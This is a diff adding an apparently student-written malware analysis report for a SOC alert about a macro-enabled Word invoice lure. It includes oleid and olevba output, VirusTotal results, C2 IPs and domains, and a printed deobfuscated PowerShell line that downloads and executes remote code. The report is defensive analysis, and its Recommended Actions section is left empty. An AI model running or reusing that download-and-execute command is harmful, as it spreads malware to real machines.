@@ -1,0 +1,135 @@
+EventID :
+76
+Event Time :
+Mar, 14, 2021, 07:15 PM
+Rule :
+SOC137 - Malicious File/Script Download Attempt
+Level :
+Security Analyst
+Source Address :
+172.16.17.37
+Source Hostname :
+NicolasPRD
+File Name :
+INVOICE PACKAGE LINK TO DOWNLOAD.docm
+File Hash :
+f2d0c66b801244c059f636d08a474079
+File Size :
+16.66 Kb
+Device Action :
+Blocked
+File (Password:infected) :
+Download
+
+
+Malware Analysis Report - [Sample Filename]
+
+1. File Information
+-------------------
+- Filename:'INVOICE PACKAGE LINK TO DOWNLOAD.docm' 
+- File Type:docx
+- Hashes (MD5, SHA-1, SHA-256):f2d0c66b801244c059f636d08a474079
+- File Size: 
+16.66 KB (17057 bytes) 
+
+2. Static Analysis
+------------------
+- VirusTotal Scan Results
+
+
+- File Metadata (ExifTool/OLETools)
+
+Creator                         : Berat Daka
+Keywords                        : 
+Description                     : 
+Last Modified By                : Berat Daka
+Revision Number                 : 1
+Create Date                     : 2021:03:13 11:14:00Z
+Modify Date                     : 2021:03:13 11:21:00Z
+Template                        : Normal.dotm
+Total Edit Time                 : 7 minutes
+Pages                           : 1
+Words                           : 13
+Characters                      : 75
+Application                     : Microsoft Office Word
+
+
+
+
+- Strings Analysis (Suspicious Text & Commands)
+
+-Ole tools:
+Oleid command:
+Indicator           |Value               |Risk      |Description               
+--------------------+--------------------+----------+--------------------------
+File format         |MS Word 2007+ Macro-|info      |                          
+                    |Enabled Document    |          |                          
+                    |(.docm)             |          |                          
+--------------------+--------------------+----------+--------------------------
+Container format    |OpenXML             |info      |Container type            
+--------------------+--------------------+----------+--------------------------
+Encrypted           |False               |none      |The file is not encrypted 
+--------------------+--------------------+----------+--------------------------
+VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
+                    |                    |          |macros. Suspicious        
+                    |                    |          |keywords were found. Use  
+                    |                    |          |olevba and mraptor for    
+                    |                    |          |more info.                
+--------------------+--------------------+----------+--------------------------
+XLM Macros          |No                  |none      |This file does not contain
+                    |                    |          |Excel 4/XLM macros.       
+--------------------+--------------------+----------+--------------------------
+External            |0                   |none      |External relationships    
+Relationships       |                    |          |such as remote templates, 
+                    |                    |          |remote OLE objects, etc   
+--------------------+--------------------+----------+--------------------------
+NOTE:
+-Vba macros detected as an ioc
+-No external relationships and XLM Macros
+
+Olevba command:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|powershell          |May run PowerShell commands                  |
+|IOC       |https://filetransfer|URL                                          |
+|          |.io/data-package/UR2|                                             |
+|          |whuBv/download'     |                                             |
++----------+--------------------+---------------------------------------------+
+Note:
+-AutoOpen function seems suspicious
+-Shell command found
+-a download url of a file is found possible ioc
+
+Strings:
+deobfuscated string:
+1)invoke-expression (new-object "Net.Webclient").downloadstring("https://filetransfer.io/data-package/UR2whuBv/download")
+
+Static Analysis(Virustotal & others):
+
+VirusTotal Scan Results
+  Detected as: Trojan TrojanDownloader VBS-RAT
+  Sources:Kaspersky Bitdefender Avast
+  Connections:
+  ips:
+   *178.175.67.109
+   *188.114.97.0
+   *188.114.96.0
+   -POSSIBLE C2CS
+  domains:
+   *lati10.ddns.net
+   *filetransfer.io
+  Files bundled:
+  *word/vbaProject.bin
+  *NewMacros.bas 
+
+4. Observations & Summary
+-------------------------
+- Malware Type:trojan vba rat
+- Impact:automatic execution of malicious executables might lead to establish a connection with a possible c2c therefore escalating the exploit
+- Recommended Actions:
+
+
